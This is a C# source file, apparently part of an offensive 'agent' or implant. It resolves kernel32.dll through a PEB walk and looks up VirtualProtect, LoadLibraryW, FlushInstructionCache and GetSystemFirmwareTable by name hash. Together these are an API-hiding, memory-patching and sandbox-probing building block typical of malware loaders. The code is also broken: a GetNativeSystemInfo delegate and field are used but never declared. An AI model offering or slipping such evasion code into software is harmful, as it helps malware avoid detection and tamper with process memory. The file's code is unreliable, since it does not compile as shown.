using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    public class Kernel32
    {
        public delegate bool ChangeMemoryProtectionDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);
        public delegate bool FlushInstructionCacheDelegate(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        public delegate uint GetSystemFirmwareTableDelegate(uint firmwareTableProviderSignature, uint firmwareTableID, byte[] firmwareTableBuffer, uint size);  
        public delegate IntPtr LoadLibraryWDelegate(string lpLibFileName);


        // Read-only fields ensure immutability and prevent accidental overwriting
        public readonly ChangeMemoryProtectionDelegate ChangeMemoryProtection;
        public readonly GetProcAddressDelegate GetProcAddress;
        public readonly FlushInstructionCacheDelegate FlushInstructionCache;
        public readonly GetSystemFirmwareTableDelegate GetSystemFirmwareTable;
        public readonly LoadLibraryWDelegate LoadLibraryW;

        public readonly IntPtr ModuleHandle;

        private Kernel32(
            IntPtr moduleHandle,
            ChangeMemoryProtectionDelegate changeMemoryProtection,
            GetNativeSystemInfoDelegate getNativeSystemInfo,
            GetProcAddressDelegate getProcAddress,
            FlushInstructionCacheDelegate flushInstructionCache,
            GetSystemFirmwareTableDelegate getSystemFirmwareTable,
            LoadLibraryWDelegate loadLibraryW)
        {
            ModuleHandle = moduleHandle;
            ChangeMemoryProtection = changeMemoryProtection;
            GetNativeSystemInfo = getNativeSystemInfo;
            GetProcAddress = getProcAddress;
            FlushInstructionCache = flushInstructionCache;
            GetSystemFirmwareTable = getSystemFirmwareTable;
            LoadLibraryW = loadLibraryW;
        }

        /// <summary>
        /// Atomically resolves module and exports using the Factory Pattern.
        /// Fully compatible with .NET Framework 2.0+ via non-generic marshalling.
        /// </summary>
        public static bool TryCreateKernel32(out Kernel32 instance)
        {
            instance = null;

            IntPtr moduleHandle = PebWalker.ResolveModuleFromPeb("kernel32.dll");
            if (moduleHandle == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to resolve KERNEL32.DLL from PEB");
            }

            IntPtr ptrVirtualProtect         = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("VirtualProtect"));
            IntPtr ptrGetNativeSystemInfo  = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetNativeSystemInfo"));
            IntPtr ptrGetProcAddress       = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetProcAddress"));
            IntPtr ptrFlushInstructionCache = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("FlushInstructionCache"));
            IntPtr ptrGetSystemFirmwareTable = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetSystemFirmwareTable"));
            IntPtr ptrLoadLibraryW = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("LoadLibraryW"));

            if (ptrVirtualProtect == IntPtr.Zero || 
                ptrGetNativeSystemInfo == IntPtr.Zero || 
                ptrGetProcAddress == IntPtr.Zero || 
                ptrFlushInstructionCache == IntPtr.Zero ||
                ptrGetSystemFirmwareTable == IntPtr.Zero ||
                ptrLoadLibraryW == IntPtr.Zero)
            {
                return false;
            }

            // Non-generic Marshal.GetDelegateForFunctionPointer for .NET 2.0 compatibility
            var changeMemoryProtection = (ChangeMemoryProtectionDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrVirtualProtect, typeof(ChangeMemoryProtectionDelegate));
            var getNativeSystemInfo = (GetNativeSystemInfoDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetNativeSystemInfo, typeof(GetNativeSystemInfoDelegate));
            var getProcAddress = (GetProcAddressDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetProcAddress, typeof(GetProcAddressDelegate));
            var flushInstructionCache = (FlushInstructionCacheDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrFlushInstructionCache, typeof(FlushInstructionCacheDelegate));
            var getSystemFirmwareTable = (GetSystemFirmwareTableDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetSystemFirmwareTable, typeof(GetSystemFirmwareTableDelegate));
            var loadLibraryW = (LoadLibraryWDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrLoadLibraryW, typeof(LoadLibraryWDelegate));
           
            

            instance = new Kernel32(
                moduleHandle,
                changeMemoryProtection,
                getNativeSystemInfo,
                getProcAddress,
                flushInstructionCache,
                getSystemFirmwareTable,
                loadLibraryW
            );

            return true;
        }
    }
}